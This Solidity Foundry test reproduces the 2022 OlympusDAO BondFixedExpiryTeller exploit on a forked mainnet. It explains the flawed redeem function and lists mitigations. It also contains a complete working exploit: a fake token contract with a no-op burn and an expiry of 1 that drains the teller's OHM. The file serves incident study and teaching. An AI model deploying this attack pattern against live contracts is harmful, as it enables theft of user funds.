// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {CheatCodes} from "../interfaces/00_CheatCodes.interface.sol";
import {IERC20} from "../interfaces/IERC20.sol";

// forge test --match-contract Exploit_OlympusDao -vvv

/*
On Oct 21, 2022 an attacker stoken $300,000 in OHM tokens from an experimental BondFixedExpiryTeller contract.
The attacker managed to exploit a redeem function that performed arbitrary tokens actions, chosing to steal only the mentioned amount.
It is important to remark that the amount stolen could have been more, but the attacker acted as a white-hat and later decided to return the funds.

// Attack Overview
Total Lost (returned later):  30,437 OHM ($302,496)
Attack Tx: https://etherscan.io/tx/0x3ed75df83d907412af874b7998d911fdf990704da87c2b1a8cf95ca5d21504cf
Ethereum Transaction Viewer: https://tx.eth.samczsun.com/ethereum/0x3ed75df83d907412af874b7998d911fdf990704da87c2b1a8cf95ca5d21504cf

Exploited Contract: 0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156
Attacker Address: 0x443cf223e209E5A2c08114A2501D8F0f9Ec7d9Be
Attacker Contract: 0xa29e4fe451ccfa5e7def35188919ad7077a4de8f
Attack Block: 15794364

// Key Info Sources
Twitter: https://twitter.com/peckshield/status/1583416829237526528
Writeup: https://mirror.xyz/0xbanky.eth/c7G9ZfTB8pzQ5cCMw5UhdFehmR6l0fVqd_B-ZuXz2_o

Principle: Poor input validation, unchecked token transfer/burn amounts.

    function redeem(ERC20BondToken token_, uint256 amount_) 
    external 
    override 
    nonReentrant {
        if (uint48(block.timestamp) < token_.expiry())
            revert Teller_TokenNotMatured(token_.expiry());
        token_.burn(msg.sender, amount_);
        token_.underlying().transfer(msg.sender, amount_);
    }

The function allows arbitraty tokens to be passed as ERC20BondToken. Simply creating a non-standard ERC20 token which has the following requirements:
- Should implement an expiry() function that returns an a uint48 amount smaller than current timestamp.
- Should do nothing while calling burn()
- Should implement an underlying() function that returns OHM address.

MITIGATIONS:
1) Ensure that the tokens passed are allowed and known tokens. Don't allow arbitrary tokens. (e.g. require(isWhitelisted(token_)))
2) Ensure that the amounts required to be burnt and transfer are respected (also unchecked transfer/burn is made here, use a safeERC20 library)
*/

address constant OHM = 0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5;
interface IBondFixedExpiryTeller {
    function redeem(ExploitOlympusToken token_, uint256 amount_) external;
}

contract ExploitOlympusToken {
    function underlying() external view returns(address) {
        return OHM;
    }

    function expiry() external pure returns (uint48 _expiry) {
        return 1;
    }

    function burn(address,uint256) external {} // it could do nothing as long as the burn(address,uint256) selector exists.
}

// forge test --match-contract Exploit_OlympusDao -vvv
contract Exploit_OlympusDao is Test {
    CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address constant internal BOND_FIXED_EXPIRY_TELLER = 0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156;
    address constant internal ATTACKER = 0x443cf223e209E5A2c08114A2501D8F0f9Ec7d9Be;
    
    ExploitOlympusToken public exploitToken;
    IBondFixedExpiryTeller public bondExpiryTeller;

    function setUp() external {
        cheat.createSelectFork("mainnet", 15794363); // We pin one block before the exploit happened.
        cheat.label(OHM, "OHM");
        cheat.label(BOND_FIXED_EXPIRY_TELLER, "BondFixedExpiryTeller");
        cheat.label(ATTACKER, "Attacker");

        exploitToken = new ExploitOlympusToken();
        bondExpiryTeller = IBondFixedExpiryTeller(BOND_FIXED_EXPIRY_TELLER);
    }

    function test_Attack() public {
        vm.startPrank(ATTACKER);
        uint256 initialTellerContractBalance = IERC20(OHM).balanceOf(BOND_FIXED_EXPIRY_TELLER);
        
        console.log("\nBefore Attack OHM Balance");
        console.log("Teller: ",IERC20(OHM).balanceOf(BOND_FIXED_EXPIRY_TELLER));
        console.log("Attacker: ",IERC20(OHM).balanceOf(ATTACKER));
        
        bondExpiryTeller.redeem(exploitToken, initialTellerContractBalance);
        
        console.log("\nAfter Attack OHM Balance");
        console.log("Teller: ",IERC20(OHM).balanceOf(BOND_FIXED_EXPIRY_TELLER));
        console.log("Attacker: ",IERC20(OHM).balanceOf(ATTACKER));

        vm.stopPrank();
    }

}
